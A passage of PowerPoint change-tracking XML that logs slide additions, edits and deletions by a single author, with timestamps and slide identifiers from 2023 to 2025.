        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4005202096" sldId="486"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T15:41:47.701" v="952" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1671134841" sldId="487"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T16:03:51.907" v="1287" actId="13926"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1787834562" sldId="488"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-02T17:23:36.418" v="2700"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2247130029" sldId="489"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T16:07:31.547" v="1415" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1203401370" sldId="490"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T16:08:42.198" v="1495" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2480118162" sldId="491"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T16:11:34.232" v="1689" actId="11529"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4077302453" sldId="492"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T16:14:16.487" v="1814" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2168155275" sldId="493"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-02T16:58:04.387" v="2699" actId="13926"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="99481651" sldId="494"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T16:25:46.972" v="2366" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1310973324" sldId="495"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T16:29:25.710" v="2436" actId="13926"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1775265781" sldId="496"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-05T08:06:53.014" v="2784" actId="1582"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="710189927" sldId="497"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T16:31:51.777" v="2686" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1897084731" sldId="498"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-09-26T16:14:30.542" v="1842" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4172756216" sldId="499"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7EED7AF2-00AE-42B1-96DD-0B15C439963F}" dt="2024-10-11T09:59:35.752" v="2794"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="949663895" sldId="500"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{DFB95AA9-27C1-4245-9D6F-4B03E908DE29}"/>
    <pc:docChg chg="modSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{DFB95AA9-27C1-4245-9D6F-4B03E908DE29}" dt="2023-02-10T15:06:10.086" v="3" actId="207"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{DFB95AA9-27C1-4245-9D6F-4B03E908DE29}" dt="2023-02-10T15:06:10.086" v="3" actId="207"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3311874055" sldId="305"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{DFB95AA9-27C1-4245-9D6F-4B03E908DE29}" dt="2023-02-10T15:06:06.381" v="2" actId="207"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="113792955" sldId="306"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{DFB95AA9-27C1-4245-9D6F-4B03E908DE29}" dt="2023-02-10T15:06:01.956" v="1" actId="207"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4273026588" sldId="307"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{DFB95AA9-27C1-4245-9D6F-4B03E908DE29}" dt="2023-02-10T15:05:57.633" v="0" actId="207"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="583477465" sldId="308"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{D176FE51-B58A-4AE6-A275-721A7B461961}"/>
    <pc:docChg chg="custSel addSld modSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{D176FE51-B58A-4AE6-A275-721A7B461961}" dt="2024-01-11T12:28:08.260" v="268" actId="11529"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{D176FE51-B58A-4AE6-A275-721A7B461961}" dt="2024-01-11T12:26:08.089" v="261" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3246440331" sldId="475"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{D176FE51-B58A-4AE6-A275-721A7B461961}" dt="2024-01-11T12:28:08.260" v="268" actId="11529"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2877657399" sldId="476"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}"/>
    <pc:docChg chg="delSld modSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:37.934" v="32" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1661475989" sldId="276"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:11:24.716" v="18" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3307480244" sldId="283"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:43.974" v="37" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1217379116" sldId="285"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3857266141" sldId="286"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4291680369" sldId="288"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3843718708" sldId="304"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:10:55.192" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3832800627" sldId="387"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:11:33.829" v="19" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2525408418" sldId="390"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="70409061" sldId="395"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1083683955" sldId="412"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2368794568" sldId="413"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1258461617" sldId="414"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2341423235" sldId="415"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:11:57.871" v="22" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1438217836" sldId="417"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:11:59.130" v="23" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="227195369" sldId="418"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:14.659" v="31" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3357514590" sldId="419"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:06.560" v="24" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1016325114" sldId="420"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:07.263" v="25" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="96474683" sldId="421"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:08.188" v="26" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2764355645" sldId="422"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:09.046" v="27" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1452393040" sldId="423"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:09.793" v="28" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="913374407" sldId="424"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:11.531" v="30" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3064632979" sldId="425"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:10.693" v="29" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="910669299" sldId="426"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="984428806" sldId="429"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="743164043" sldId="430"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3252739445" sldId="431"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="47218141" sldId="432"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2228756506" sldId="433"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3687114822" sldId="434"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1705927042" sldId="435"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3837458877" sldId="436"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4161819071" sldId="437"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3170302261" sldId="438"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="776674572" sldId="440"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1532007744" sldId="447"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1592848847" sldId="448"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2377860639" sldId="449"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1259852005" sldId="450"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2228856731" sldId="451"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2458016184" sldId="452"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="514975812" sldId="453"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1476887883" sldId="454"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="606407850" sldId="455"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4041387428" sldId="456"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
